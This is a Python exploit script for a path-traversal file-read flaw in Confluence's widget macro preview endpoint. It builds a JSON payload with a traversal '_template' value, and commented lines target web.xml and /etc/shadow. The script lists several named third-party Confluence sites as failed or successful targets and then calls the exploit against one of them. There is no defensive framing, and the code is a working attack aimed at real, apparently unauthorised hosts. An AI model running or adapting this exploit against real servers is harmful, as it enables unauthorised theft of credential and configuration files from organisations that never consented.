import re
import requests

requests.packages.urllib3.disable_warnings()


def exploit(url):
    #filename to read
    # filename = "../web.xml"
    # filename = "../../../../../../../../../../../../../../../etc/shadow"
    # filename = "../sitemesh.xml"
    # filename = "../../favicon.ico"
    filename = "../../blank.html"
    # limitSize = 1000
    paylaod = url + "/rest/tinymce/1/macro/preview"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Referer": url + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"
    }
    data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
    r = requests.post(paylaod, data=data, headers=headers, verify=False)
    # print (r.text)

    if r.status_code == 200:
        #the file is between <div class="wiki-content"> and  <\/div> 
        m = re.search('<div class="wiki-content">[\s\S]+<\/div>', r.text)
        if m:
            print (m.group())
        else:
            print ('error')

#failed
url3 = 'https://wiki.library.oregonstate.edu'
url2 = 'https://wiki.sei.cmu.edu'
url4 = 'https://confluence.noc.flrnet.org'

#success
url = 'http://confluence.ulucu.com'
url5 = 'https://confluence.qps.nl'
exploit(url)
